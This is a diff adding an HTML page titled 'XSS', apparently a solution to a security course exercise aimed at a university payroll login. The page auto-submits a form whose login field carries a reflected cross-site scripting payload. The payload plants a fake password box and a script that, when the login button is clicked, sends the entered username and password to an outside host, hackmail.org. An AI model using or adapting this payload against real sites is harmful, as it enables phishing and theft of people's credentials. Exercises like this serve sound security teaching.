@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSS</title>
+  </head>
+  <body>
+    <form action="http://payroll.gatech.edu" onsubmit="" method="POST">
+	    <input id="injection_point" name="login" value="" />
+    </form>
+    <script>
+	    let entry = document.getElementById('injection_point');
+entry.value = `
+" id="uname" />
+<label>Password</label>
+       <input type="password" name="pw" id="pwd">
+       <div>
+        <button class="btn" type="submit" name="action" value="login" id="submit-btn">Log In</button>
+       </div>
+      </fieldset>
+      </form>
+<script>
+	document.getElementById('submit-btn').onclick = function() {
+	let uname = document.getElementById('uname').value;
+	let pwd = document.getElementById('pwd').value;
+	let user = "MjAyM1NwcmluZyYmRWFzdGVyRWdnYGBUYXJnZXQyLVRoaXNPbmVDYW5CZURpZmZpY3VsdF5e";
+	(new Image()).src='http://hackmail.org/sendmail.php?' + '&username='+user+'&payload='+uname + ' ' + pwd + '&random=' + Math.random();
+	};
+<\/script>
+<form style="display:none;">
+<fieldset>
+<input type="hidden" value="
+`;
+document.forms[0].submit();
+    </script>
+  </body>
+</html>
